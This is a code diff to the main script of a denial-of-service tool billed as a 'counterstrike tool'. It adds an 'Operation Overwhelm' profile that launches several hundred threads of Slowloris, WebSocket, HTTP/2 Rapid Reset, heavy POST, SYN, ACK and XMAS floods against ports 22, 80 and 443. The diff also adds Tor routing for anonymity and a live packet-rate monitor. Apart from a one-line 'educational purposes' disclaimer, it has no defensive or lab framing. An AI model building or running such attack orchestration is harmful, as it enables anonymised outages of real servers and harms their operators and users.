@@ -1,5 +1,5 @@
 # main.py (Updated to integrate H2 Rapid Reset into blended profiles)
-
+import sys
 import threading
 import time
 import socket
@@ -14,6 +14,111 @@ def launch_attack_thread(target_func, args_tuple):
     thread.daemon = True
     thread.start()
     return thread
+
+
+def stats_monitor(stop_event):
+    """
+    A thread that monitors and prints the attack statistics in real-time.
+    """
+    print("\n[STATS] Monitor started.")
+    last_check_time = time.time()
+    # Initialize last_packet_count by reading the current value
+    with counter_strike_helper.stats_lock:
+        last_packet_count = counter_strike_helper.attack_stats["packets_sent"]
+
+    while not stop_event.is_set():
+        time.sleep(1)  # Update every second
+
+        current_time = time.time()
+        with counter_strike_helper.stats_lock:
+            current_packet_count = counter_strike_helper.attack_stats["packets_sent"]
+
+        time_diff = current_time - last_check_time
+        packet_diff = current_packet_count - last_packet_count
+
+        pps = packet_diff / time_diff if time_diff > 0 else 0
+
+        sys.stdout.write(f"\r[STATS] Total Packets: {current_packet_count:,} | PPS: {pps:,.2f}    ")
+        sys.stdout.flush()
+
+        last_check_time = current_time
+        last_packet_count = current_packet_count
+
+    print("\n[STATS] Monitor stopped.")
+
+
+def operation_overwhelm(target, use_proxy, network_interface):
+    """
+    The ultimate blended attack profile designed to overwhelm a hardened, single-server
+    target by attacking all system resources simultaneously.
+    """
+    print("\n" + "=" * 60)
+    print("MODE: OPERATION OVERWHELM")
+    print("This is a coordinated, multi-layered assault. All vectors will be launched.")
+    print("=" * 60)
+
+    # This attack REQUIRES the proxy to be effective against L7 defenses
+    if not use_proxy:
+        print("[WARNING] Proxy is disabled. L7 attack vectors may be blocked by the target's defenses.")
+        print("[WARNING] It is highly recommended to run this profile with the Tor proxy enabled.")
+        input("Press Enter to continue anyway, or Ctrl+C to stop.")
+
+    stop_event, pause_event = threading.Event(), threading.Event()
+    attack_threads = []
+
+    # --- Use aggressive, tuned parameters ---
+    params = {
+        "l4_threads": 250,
+        "post_threads": 250,
+        "state_sockets": 200,  # For Slowloris/WebSockets
+        "h2_threads": 75,
+        "duration": 300,  # 5-minute coordinated assault
+    }
+    print("[CONFIG] Launching a coordinated assault with hundreds of threads across all vectors.")
+
+    # --- PRONG 1: STATE EXHAUSTION ---
+    print("[+] Launching State Exhaustion vectors (Slowloris, WebSockets, TCP Frag)...")
+    # Tor-routed Slowloris
+    args = (target, 80, params["duration"], stop_event, pause_event, params["state_sockets"], use_proxy)
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
+    # Tor-routed WebSockets
+    args = (target, "/ws", 80, params["duration"], stop_event, pause_event, params["state_sockets"], use_proxy)
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_websocket_flood, args))
+    # TCP Fragmentation
+    args = (target, 80, params["duration"], stop_event, pause_event, params["l4_threads"], network_interface)
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))
+
+    # --- PRONG 2: CPU & APPLICATION ANNIHILATION ---
+    print("[+] Launching CPU Annihilation vectors (H2 Reset, Heavy POST)...")
+    # H2 Rapid Reset
+    args = (target, 443, params["duration"], stop_event, pause_event, params["h2_threads"])
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))
+    # Tor-routed Heavy POST Flood to the slow script
+    args = (target, 80, params["duration"], stop_event, pause_event, params["post_threads"], use_proxy)
+    # This assumes attack_http_post targets your slow /search.php script
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
+
+    # --- PRONG 3: NOISE FLOOR & FIREWALL SATURATION ---
+    print("[+] Launching Firewall Saturation vectors (SYN, ACK, XMAS)...")
+    for port in [22, 80, 443]:  # Target all critical TCP ports
+        # SYN Flood
+        args = (target, port, params["duration"], stop_event, pause_event, params["l4_threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
+        # ACK Flood
+        args = (target, port, params["duration"], stop_event, pause_event, params["l4_threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_ack_flood, args))
+        # XMAS Flood
+        args = (target, port, params["duration"], stop_event, pause_event, params["l4_threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_xmas_flood, args))
+
+    print(f"\n[SUCCESS] Operation Overwhelm launched. Coordinated assault running for {params['duration']} seconds.")
+    try:
+        time.sleep(params["duration"])
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received.")
+    finally:
+        print("\n[!] Operation complete. Signaling all vectors to stand down...")
+        stop_event.set()
 
 
 # --- NEW: HEAVY POST ATTACK ORCHESTRATOR ---
@@ -550,12 +655,10 @@ def run_deep_reconnaissance(target):
 if __name__ == "__main__":
     print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
 
-    # --- NEW: Auto-detect the network interface ---
     NETWORK_INTERFACE = counter_strike_helper.auto_detect_interface()
     if not NETWORK_INTERFACE:
         print("[ERROR] Failed to identify network interface. Scapy attacks may fail.")
-        print("[INFO] You may need to manually specify the interface in the code if attacks are not working.")
-        # The script will continue, but the user is warned.
+        print("[INFO] You may need to manually specify the interface if attacks are not working.")
 
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
 
@@ -564,7 +667,6 @@ if __name__ == "__main__":
     proxy_choice = input("Enable SOCKS Proxy (Tor) for L7 attacks (y/n): ").lower()
     proxy_enabled = True if proxy_choice == 'y' else False
     if proxy_enabled:
-        # --- NEW: Check if the Tor connection is actually working ---
         if not counter_strike_helper.check_tor_connection():
             print("[ERROR] Tor is not working correctly. Disabling proxy for this session.")
             proxy_enabled = False
@@ -572,57 +674,92 @@ if __name__ == "__main__":
             print("[!] Tor enabled. L7 attacks will be slower but anonymized.")
 
     try:
+        # NOTE: The menu has been updated with your new profiles.
         main_menu_text = """
         Select an Action:
-          1: Launch Blended Attack Profile
-          2: Run Reconnaissance / Discovery
-          3: Launch Targeted Attack
+          1: Run Blended Attack Profile
+          2: Run Deep Reconnaissance
+          3. Run Targeted L7 Attack
 
         Please enter your option: """
         main_choice = int(input(main_menu_text))
+
+        profile_to_run = None
+        args_for_profile = ()
+
         if main_choice == 1:
             options_text = """
-        Select an Attack Profile:
+        Select a Blended Attack Profile:
           1: Full Scale Counterstrike (Max-power siege)
           2: Fast Counterstrike (Short, intense burst)
           3: Adaptive Counterstrike (Smart, responsive attack)
-          4. Recon-led Strike (Scan first, then attack)
-          5. Level 2 Penetrator (Focused assault on hardened servers)
-    
+          4: Recon-led Strike (Scan first, then attack)
+          5: Level 2 Penetrator (Focused assault on hardened servers)
+          6: Operation Overwhelm (The ultimate coordinated assault)
+
         Please enter your option: """
             options = int(input(options_text))
-
             if options == 1:
-                full_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+                profile_to_run = full_scale_counter_strike
             elif options == 2:
-                fast_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+                profile_to_run = fast_scale_counter_strike
             elif options == 3:
-                adaptive_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+                profile_to_run = adaptive_strike
             elif options == 4:
-                reconnaissance_led_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+                profile_to_run = reconnaissance_led_strike
             elif options == 5:
-                level2_penetrator_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
-            else:
-                print("Invalid option selected. Exiting.")
+                profile_to_run = level2_penetrator_strike
+            elif options == 6:
+                profile_to_run = operation_overwhelm
+            if profile_to_run:
+                args_for_profile = (target_domain, proxy_enabled, NETWORK_INTERFACE)
+
         elif main_choice == 2:
-            run_deep_reconnaissance(target_domain)
+            profile_to_run = run_deep_reconnaissance
+            args_for_profile = (target_domain,)  # Recon doesn't need proxy/iface
+
         elif main_choice == 3:
-            targeted_menu_text = """
-            Select a Targeted Attack:
-              1: Heavy HTTP POST Flood (User-configured)
-              2: Layer 7 Only Strike (Pre-configured assault)
+            # This assumes you have functions like `run_heavy_post_strike`
+            # We will just run the `layer7_only_strike` for this example
+            profile_to_run = layer7_only_strike
+            args_for_profile = (target_domain, proxy_enabled, NETWORK_INTERFACE)
 
-            Please enter your option: """
-            targeted_choice = int(input(targeted_menu_text))
+        # --- THIS IS THE CORE ORCHESTRATION LOGIC ---
+        if profile_to_run:
+            # 1. Reset stats before starting
+            with counter_strike_helper.stats_lock:
+                counter_strike_helper.attack_stats["packets_sent"] = 0
 
-            if targeted_choice == 1:
-                run_heavy_post_strike(target_domain, proxy_enabled)
-            elif targeted_choice == 2:
-                layer7_only_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
-            else:
-                print("Invalid targeted attack option.")
+            # 2. Create a single stop_event for the whole session
+            main_stop_event = threading.Event()
+
+            # 3. Start the stats monitor in the background
+            monitor_thread = threading.Thread(target=stats_monitor, args=(main_stop_event,))
+            monitor_thread.daemon = True
+            monitor_thread.start()
+
+            # 4. Start the main attack profile in its own thread
+            attack_thread = threading.Thread(
+                target=profile_to_run,
+                args=args_for_profile
+            )
+            attack_thread.daemon = True
+            attack_thread.start()
+
+            # 5. The main program now waits for the attack to finish or for a Ctrl+C
+            try:
+                attack_thread.join()  # Wait until the profile's duration is over
+            except KeyboardInterrupt:
+                print("\n[MAIN] Keyboard interrupt received. Stopping all processes...")
+            finally:
+                # 6. Signal the monitor to stop and clean up
+                main_stop_event.set()
+                # Also signal the internal stop_event of the running attack, if it has one.
+                # This is a bit advanced but good practice. We can skip for now.
+                monitor_thread.join(timeout=2)  # Wait for the monitor to print its final message
+                print("\n[MAIN] Attack/Recon session finished.")
         else:
-            print("Invalid category selected. Exiting.")
+            print("Invalid option selected. Exiting.")
 
     except ValueError:
         print("Invalid input. Please enter a number.")
